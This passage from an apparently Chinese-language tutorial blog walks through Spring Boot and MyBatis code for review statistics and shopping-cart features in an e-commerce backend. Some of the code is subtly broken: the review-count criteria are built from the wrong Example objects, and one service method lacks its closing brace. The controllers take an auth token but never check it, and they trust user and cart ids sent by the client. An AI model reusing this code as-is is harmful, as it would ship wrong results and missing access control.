<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713150611632.png" alt="image-20220713150611632"></p>
</li>
</ul>
</li>
<li><p>评价分析</p>
<p>对该商品的评价进行分类，分为好评中评和差评</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713112838049.png" alt="image-20220713112838049"></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713113028811.png" alt="image-20220713113028811"></p>
<p>响应数据如图所示，可以看出是单表查询</p>
<ul>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
 <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getCommentsCountByProductId</span><span class="hljs-params">(String productId)</span> </span>&#123;
    <span class="hljs-comment">// 查询商品总数</span>
     Example example = <span class="hljs-keyword">new</span> Example(ProductComments.class);
     Example.Criteria criteria = example.createCriteria();
     criteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
     <span class="hljs-keyword">int</span> total = productCommentsMapper.selectCountByExample(criteria);
    
     <span class="hljs-comment">// 查询好评数</span>
     Example example1 = <span class="hljs-keyword">new</span> Example(ProductComments.class);
     Example.Criteria criteria1 = example1.createCriteria();
     criteria1.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
     criteria1.andEqualTo(<span class="hljs-string">&quot;commType&quot;</span>, <span class="hljs-number">1</span>);
     <span class="hljs-keyword">int</span> goodTotal = productCommentsMapper.selectCountByExample(example1);
    
     <span class="hljs-comment">// 查询中评数</span>
     Example example2 = <span class="hljs-keyword">new</span> Example(ProductComments.class);
     Example.Criteria criteria2 = example1.createCriteria();
     criteria2.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
     criteria2.andEqualTo(<span class="hljs-string">&quot;commType&quot;</span>, <span class="hljs-number">0</span>);
     <span class="hljs-keyword">int</span> midTotal = productCommentsMapper.selectCountByExample(example2);
    
     <span class="hljs-comment">// 查询差评数</span>
     Example example3 = <span class="hljs-keyword">new</span> Example(ProductComments.class);
     Example.Criteria criteria3 = example1.createCriteria();
     criteria3.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
     criteria3.andEqualTo(<span class="hljs-string">&quot;commType&quot;</span>, -<span class="hljs-number">1</span>);
     <span class="hljs-keyword">int</span> badTotal = productCommentsMapper.selectCountByExample(example3);
    
     <span class="hljs-comment">// 好评率</span>
     <span class="hljs-keyword">double</span> percent = (Double.parseDouble(goodTotal+<span class="hljs-string">&quot;&quot;</span>)/Double.parseDouble(total + <span class="hljs-string">&quot;&quot;</span>)) * <span class="hljs-number">100</span>;
     String percentValue = (percent+<span class="hljs-string">&quot;&quot;</span>).substring(<span class="hljs-number">0</span>,(percent+<span class="hljs-string">&quot;&quot;</span>).lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">3</span>);
    
     HashMap&lt;String, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
     hashMap.put(<span class="hljs-string">&quot;total&quot;</span>, total);
     hashMap.put(<span class="hljs-string">&quot;goodTotal&quot;</span>, goodTotal);
     hashMap.put(<span class="hljs-string">&quot;badTotal&quot;</span>, badTotal);
     hashMap.put(<span class="hljs-string">&quot;midTotal&quot;</span>, midTotal);
     hashMap.put(<span class="hljs-string">&quot;percent&quot;</span>, percentValue);
     
     <span class="hljs-keyword">return</span> ResultVO.success(hashMap);
    
 &#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java">    
<span class="hljs-meta">@ApiOperation(&quot;商品总体评价信息查询接口&quot;)</span>
<span class="hljs-meta">@GetMapping(&quot;/detail-commontscount/&#123;pid&#125;&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductCommontscount</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;pid&quot;)</span> String pid)</span></span>&#123;
    <span class="hljs-keyword">return</span> productCommontsService.getCommentsCountByProductId(pid);
&#125;</code></pre>

</li>
</ul>
</li>
</ul>
<h3 id="1-9-购物车业务"><a href="#1-9-购物车业务" class="headerlink" title="1.9 购物车业务"></a>1.9 购物车业务</h3><h4 id="添加购物车"><a href="#添加购物车" class="headerlink" title="添加购物车"></a>添加购物车</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713151431751.png" alt="image-20220713151431751"></p>
<ul>
<li><p>Service</p>
<pre><code class="hljs java"><span class="hljs-keyword">private</span> SimpleDateFormat sdf = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>);    
<span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">addShoppingCart</span><span class="hljs-params">(ShoppingCart cart)</span> </span>&#123;
    cart.setCartTime(sdf.format(<span class="hljs-keyword">new</span> Date()));
    <span class="hljs-keyword">int</span> i = shoppingCartMapper.insert(cart);
    <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">0</span>)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK,<span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-keyword">null</span>);
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO,<span class="hljs-string">&quot;fail&quot;</span>,<span class="hljs-keyword">null</span>);
    &#125;
</code></pre>
</li>
<li><p>Controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/add&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">addShoppingCart</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> ShoppingCart cart)</span></span>&#123;
    ResultVO resultVO = shoppingCartService.addShoppingCart(cart);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre>



</li>
</ul>
<h4 id="获取购物车列表"><a href="#获取购物车列表" class="headerlink" title="获取购物车列表"></a>获取购物车列表</h4><ul>
<li>sql</li>
</ul>
  <pre><code class="hljs mysql">select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,
c.product_price, c.sku_props,p.product_name, i.url,s.original_price,s.sell_price,s.sku_name
from shopping_cart c 
inner JOIN product p
INNER JOIN product_sku s
INNER JOIN product_img i
ON c.product_id &#x3D; p.product_id
AND c.sku_id&#x3D;s.sku_id
AND c.product_id&#x3D;i.item_id
WHERE c.user_id &#x3D; 1
AND i.is_main&#x3D;1</code></pre>

<ul>
<li><p>dao</p>
<p>创建一个新的实体类用于保存返回的数据</p>
<pre><code class="hljs java"><span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShoppingCartVO</span> </span>&#123;
    <span class="hljs-keyword">private</span> Integer cartId;
    <span class="hljs-keyword">private</span> String productId;
    <span class="hljs-keyword">private</span> String skuId;
    <span class="hljs-keyword">private</span> String userId;
    <span class="hljs-keyword">private</span> String cartNum;
    <span class="hljs-keyword">private</span> String cartTime;
    <span class="hljs-keyword">private</span> BigDecimal productPrice;
    <span class="hljs-keyword">private</span> String skuProps;

    <span class="hljs-keyword">private</span> String productName;
    <span class="hljs-keyword">private</span> String productImg;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">double</span> originalPrice;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">double</span> sellPrice;
    <span class="hljs-keyword">private</span> String skuName;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> skuStock;  <span class="hljs-comment">//库存</span>
&#125;</code></pre>

<p>mapper</p>
<pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;ShoppingCartVO&gt; <span class="hljs-title">selectShopcartByUserId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> userId)</span></span>;</code></pre>

<p>xml</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ShoppingCartVOMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ShoppingCartVO&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_num&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartNum&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartTime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_props&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuProps&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productImg&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;original_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;originalPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sell_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sellPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuName&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
  
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectShopcartByUserId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ShoppingCartVOMap&quot;</span>&gt;</span>
  select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,
   c.product_price, c.sku_props,  p.product_name, i.url,s.original_price,s.sell_price,s.sku_name
  from shopping_cart c
  INNER JOIN product p
  INNER JOIN product_img i
  INNER JOIN product_sku s
  ON c.product_id = p.product_id
  and i.item_id=p.product_id
  and c.sku_id=s.sku_id
  where user_id = #&#123;userId&#125;
  and i.is_main=1
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Transactional(propagation = Propagation.SUPPORTS)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listShoppingCartsByUserId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> userId)</span> </span>&#123;
    List&lt;ShoppingCartVO&gt; list = shoppingCartMapper.selectShopcartByUserId(userId);
    ResultVO resultVO = <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>, list);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre>



</li>
</ul>
<ul>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/list&quot;)</span>
<span class="hljs-meta">@ApiImplicitParam(dataType = &quot;int&quot;,name = &quot;userId&quot;, value = &quot;用户ID&quot;,required = true)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">list</span><span class="hljs-params">(Integer userId,<span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span>String token)</span></span>&#123;
    ResultVO resultVO = shoppingCartService.listShoppingCartsByUserId(userId);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre>



</li>
</ul>
<ul>
<li><h4 id="更新购物车"><a href="#更新购物车" class="headerlink" title="更新购物车"></a>更新购物车</h4></li>
</ul>
<p>更新购物车发送的请求如下，由分析可以看出url的格式如下，并且发送的是put请求</p>
<pre><code class="hljs awk"><span class="hljs-regexp">/shopcart/u</span>pdate<span class="hljs-regexp">/&#123;cartId&#125;/</span>&#123;num&#125;</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714105311322.png" alt="image-20220714105311322"></p>
<ul>
<li><p>sql</p>
<p>使用update方法对对应的购物车记录进行修改即可</p>
<pre><code class="hljs routeros">update shopping_cart <span class="hljs-builtin-name">set</span> <span class="hljs-attribute">cart_num</span>=3 where <span class="hljs-attribute">cart_id</span>=1</code></pre>



</li>
</ul>
<ul>
<li><p>dao</p>
<p>xml</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectShopcartByUserId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ShoppingCartVOMap&quot;</span>&gt;</span>
  select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,
   c.product_price, c.sku_props,  p.product_name, i.url,s.original_price,s.sell_price,s.sku_name
  from shopping_cart c
  INNER JOIN product p
  INNER JOIN product_img i
  INNER JOIN product_sku s
  ON c.product_id = p.product_id
  and i.item_id=p.product_id
  and c.sku_id=s.sku_id
  where user_id = #&#123;userId&#125;
  and i.is_main=1
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updateCartnumByCartid&quot;</span>&gt;</span>
  update shopping_cart set cart_num=#&#123;cartNum&#125; where cart_id=#&#123;cartId&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span></code></pre>

<p>mapper</p>
<pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">updateCartnumByCartid</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;cartId&quot;)</span> <span class="hljs-keyword">int</span> cartId,</span></span>
<span class="hljs-function"><span class="hljs-params">                                 <span class="hljs-meta">@Param(&quot;cartNum&quot;)</span> <span class="hljs-keyword">int</span> cartNum)</span></span>;</code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">updateCartNum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> cartId, <span class="hljs-keyword">int</span> cartNum)</span> </span>&#123;
    <span class="hljs-keyword">int</span> i = shoppingCartMapper.updateCartnumByCartid(cartId, cartNum);
    <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">0</span>)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK,<span class="hljs-string">&quot;update success&quot;</span>,<span class="hljs-keyword">null</span>);
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO,<span class="hljs-string">&quot;update fail&quot;</span>,<span class="hljs-keyword">null</span>);
    &#125;
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java">
<span class="hljs-meta">@PutMapping(&quot;/update/&#123;cid&#125;/&#123;cnum&#125;&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">updateNum</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;cid&quot;)</span> Integer cartId,</span></span>
<span class="hljs-function"><span class="hljs-params">                          <span class="hljs-meta">@PathVariable(&quot;cnum&quot;)</span> Integer cartNum,</span></span>
<span class="hljs-function"><span class="hljs-params">                          <span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span> String token)</span></span>&#123;
    ResultVO resultVO = shoppingCartService.updateCartNum(cartId, cartNum);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre>

</li>
</ul>
<p>获取购物车列表信息</p>
<blockquote>
<p>当点击结算时，页面会跳转到结算页面，这里依然需要显示订单中的信息，但是这里需要的是批量结算，所以需要批量获取</p>
</blockquote>
<p>从前端发起的请求可以看到cids为本次请求的所有购物车订单</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714124912790.png" alt="image-20220714124912790"></p>
<p>响应结果如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714125042189.png" alt="image-20220714125042189"></p>
<p>从中可以看到与获取购物车列表使用到的sql语句大致相同</p>
<ul>
<li><p>sql</p>
<pre><code class="hljs mysql">select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,
c.product_price, c.sku_props,  p.product_name, i.url,s.original_price,s.sell_price,s.sku_name,s.stock
from shopping_cart c
INNER JOIN product p
INNER JOIN product_img i
INNER JOIN product_sku s
ON c.product_id &#x3D; p.product_id
and i.item_id&#x3D;p.product_id
and c.sku_id&#x3D;s.sku_id
where i.is_main&#x3D;1 and c.cart_id in (6,7)</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714125332136.png" alt="image-20220714125332136"></p>
</li>
<li><p>dao</p>
<p>创建新的实体类保存结果</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 新增 productName、productImg</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShoppingCartVO</span> </span>&#123;
    <span class="hljs-keyword">private</span> Integer cartId;
    <span class="hljs-keyword">private</span> String productId;
    <span class="hljs-keyword">private</span> String skuId;
    <span class="hljs-keyword">private</span> String userId;
    <span class="hljs-keyword">private</span> String cartNum;
    <span class="hljs-keyword">private</span> String cartTime;
    <span class="hljs-keyword">private</span> BigDecimal productPrice;
    <span class="hljs-keyword">private</span> String skuProps;

    <span class="hljs-keyword">private</span> String productName;
    <span class="hljs-keyword">private</span> String productImg;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">double</span> originalPrice;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">double</span> sellPrice;
    <span class="hljs-keyword">private</span> String skuName;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> skuStock;  <span class="hljs-comment">//库存</span>
&#125;</code></pre>

<p>Mapper中代码</p>
<pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;ShoppingCartVO&gt; <span class="hljs-title">selectShopcartByCids</span><span class="hljs-params">(List&lt;Integer&gt; cids)</span></span>;</code></pre>

<p>xml</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ShoppingCartVOMap2&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ShoppingCartVO&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_num&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartNum&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartTime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_props&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuProps&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productImg&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;original_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;originalPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sell_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sellPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuName&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;stock&quot;</span>  <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuStock&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
  
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectShopcartByCids&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ShoppingCartVOMap2&quot;</span>&gt;</span>
  select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,
  c.product_price, c.sku_props,  p.product_name, i.url,s.original_price,s.sell_price,s.sku_name,s.stock
  from shopping_cart c
  INNER JOIN product p
  INNER JOIN product_img i
  INNER JOIN product_sku s
  ON c.product_id = p.product_id
  and i.item_id=p.product_id
  and c.sku_id=s.sku_id
  where i.is_main=1 and c.cart_id in
  <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">&quot;cids&quot;</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&quot;cid&quot;</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">&quot;,&quot;</span> <span class="hljs-attr">open</span>=<span class="hljs-string">&quot;(&quot;</span> <span class="hljs-attr">close</span>=<span class="hljs-string">&quot;)&quot;</span>&gt;</span>
      #&#123;cid&#125;
  <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listShoppingCartsByCids</span><span class="hljs-params">(String cids)</span> </span>&#123;
    <span class="hljs-comment">// 将前端请求携带的字符串转换成int数组 </span>
    List&lt;Integer&gt; cartIds = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
    String[] strings = cids.split(<span class="hljs-string">&quot;,&quot;</span>);
    <span class="hljs-keyword">for</span> (String string : strings) &#123;
        cartIds.add(Integer.parseInt(string));
    &#125;
    List&lt;ShoppingCartVO&gt; list = shoppingCartMapper.selectShopcartByCids(cartIds);
    <span class="hljs-keyword">return</span> ResultVO.success(list);
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/listbycids&quot;)</span>
<span class="hljs-meta">@ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;选择的购物车记录的id&quot;,required = true)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listByCids</span><span class="hljs-params">(String cids, <span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span>String token)</span></span>&#123;
    ResultVO resultVO = shoppingCartService.listShoppingCartsByCids(cids);
    <span class="hljs-keyword">return</span> resultVO;
&#125;
</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714130445019.png" alt="image-20220714130445019"></p>
</li>
</ul>
